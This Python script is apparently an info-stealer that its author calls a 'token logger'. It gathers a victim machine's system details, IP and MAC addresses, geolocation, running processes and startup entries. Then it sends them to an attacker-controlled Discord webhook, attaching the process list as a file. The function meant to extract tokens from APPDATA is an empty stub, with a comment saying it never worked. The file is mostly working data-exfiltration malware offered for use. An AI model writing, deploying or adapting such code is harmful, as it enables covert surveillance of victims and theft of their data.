# Import necessary modules
import psutil
import platform
from datetime import datetime
import requests
import socket
import os
from uuid import getnode as get_mac
from dhooks import Webhook, File
import subprocess
import winreg

# scaling
def scale(size, suffix="B"):
    for unit in ["", "K", "M", "G", "T", "P"]:
        if size < 1024.0:
            return f"{size:.2f}{unit}{suffix}"
        size /= 1024.0

# system info
def get_system_info():
    uname = platform.uname()
    bt = datetime.fromtimestamp(psutil.boot_time())
    return uname, bt

# cpu info
def get_cpu_info():
    cpufreq = psutil.cpu_freq()
    return cpufreq

# mem info
def get_memory_info():
    svmem = psutil.virtual_memory()
    return svmem

# disk
def get_disk_info():
    partition_usage = psutil.disk_usage("/")
    disk_io = psutil.disk_io_counters()
    return partition_usage, disk_io

# network
def get_network_info():
    net_io = psutil.net_io_counters()
    return net_io

# geoloc
def get_geolocation_info():
    try:
        ip_response = requests.get("https://ipinfo.io/")
        ip_data = ip_response.json()
        return ip_data
    except Exception as e:
        print(f"Error fetching IP information: {e}")
        return {}

# tokens
def extract_tokens(directory):
    tokens = []

    # Doesnt work i already tried

    return tokens

# Function to get list of background processes
def get_background_processes():
    try:
        output_file = "background_processes.txt"
        # tasklist
        result = subprocess.run(["tasklist", "/fo", "csv", "/nh"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        with open(output_file, 'w') as f:
            f.write(result.stdout)
        return output_file
    except Exception as e:
        print(f"Error fetching background processes: {e}")
        return None

# USB 
def get_usb_devices():
    devices = []
    return devices

# startup 
def get_startup_programs():
    startup_programs = []
    try:
        # startup programs
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
        for i in range(winreg.QueryInfoKey(key)[1]):
            startup_programs.append(winreg.EnumValue(key, i)[0])
        winreg.CloseKey(key)

        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
        for i in range(winreg.QueryInfoKey(key)[1]):
            startup_programs.append(winreg.EnumValue(key, i)[0])
        winreg.CloseKey(key)

        return startup_programs

    except Exception as e:
        print(f"Error fetching startup programs: {e}")
        return []

# log tokens 
def token_logger(webhook_url):
    try:
        # system info
        uname, bt = get_system_info()
        cpufreq = get_cpu_info()
        svmem = get_memory_info()
        partition_usage, disk_io = get_disk_info()
        net_io = get_network_info()
        geolocation_info = get_geolocation_info()

        #  tokens 
        tokens = extract_tokens(os.getenv('APPDATA'))

        #   save to a file
        background_processes_file = get_background_processes()

        #  USB devices
        usb_devices = get_usb_devices()

        # startup programs
        startup_programs = get_startup_programs()

        # geolocation thingie im too lazy to add
        proxy = ""  
        localip = socket.gethostbyname(socket.gethostname())
        publicip = geolocation_info.get('ip', 'N/A')
        mac = ':'.join(("%012X" % get_mac())[i:i+2] for i in range(0, 12, 2))
        country = geolocation_info.get('country', 'N/A')
        callcode = geolocation_info.get('country_calling_code', 'N/A')
        timezone = geolocation_info.get('timezone', 'N/A')
        region = geolocation_info.get('region', 'N/A')
        city = geolocation_info.get('city', 'N/A')
        postal = geolocation_info.get('postal', 'N/A')
        currency = geolocation_info.get('currency', 'N/A')

        # Discord webhook
        hook = Webhook(webhook_url)

        #  message content in box
        message_content = (
            f"```\n"
            f"System Information - {platform.node()}:\n\n"
            f"GeoLocation:\n"
            f"Using VPN?: {proxy}\n"
            f"Local IP: {localip}\n"
            f"Public IP: {publicip}\n"
            f"MAC Address: {mac}\n\n"
            f"Country: {country} | {callcode} | {timezone}\n"
            f"Region: {region}\n"
            f"City: {city} | {postal}\n"
            f"Currency: {currency}\n\n\n"
        )

        message_content += (
            f"System Information:\n"
            f"System: {uname.system}\n"
            f"Node: {uname.node}\n"
            f"Machine: {uname.machine}\n"
            f"Processor: {uname.processor}\n"
            f"Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}\n\n\n"
        )

        message_content += (
            f"CPU Information:\n"
            f"Physical cores: {psutil.cpu_count(logical=False)}\n"
            f"Total Cores: {psutil.cpu_count(logical=True)}\n"
            f"Max Frequency: {cpufreq.max:.2f}Mhz\n"
            f"Min Frequency: {cpufreq.min:.2f}Mhz\n"
            f"Total CPU usage: {psutil.cpu_percent()}\n\n\n"
        )

        message_content += (
            f"Memory Information:\n"
            f"Total: {scale(svmem.total)}\n"
            f"Available: {scale(svmem.available)}\n"
            f"Used: {scale(svmem.used)}\n"
            f"Percentage: {svmem.percent}%\n\n\n"
        )

        message_content += (
            f"Disk Information:\n"
            f"Total Size: {scale(partition_usage.total)}\n"
            f"Used: {scale(partition_usage.used)}\n"
            f"Free: {scale(partition_usage.free)}\n"
            f"Percentage: {partition_usage.percent}%\n"
            f"Total read: {scale(disk_io.read_bytes)}\n"
            f"Total write: {scale(disk_io.write_bytes)}\n\n\n"
        )

        message_content += (
            f"Network Information:\n"
            f"Total Sent: {scale(net_io.bytes_sent)}\")\n"
            f"Total Received: {scale(net_io.bytes_recv)}\n\n\n"
        )

        message_content += (
            f"USB Devices:\n"
            f"{', '.join(usb_devices)}\n\n\n"
        )

        message_content += (
            f"Startup Programs:\n"
            f"{', '.join(startup_programs)}\n"
            f"```\n"
        )

        # Send the message content and attach background processes file
        if background_processes_file:
            hook.send(message_content, file=File(background_processes_file))

        print("sent.")

    except Exception as e:
        print(f"error: {e}")

# webhook thingie
if __name__ == "__main__":
    webhook_url = "ENTERYOURWEBHOOK"
    token_logger(webhook_url)
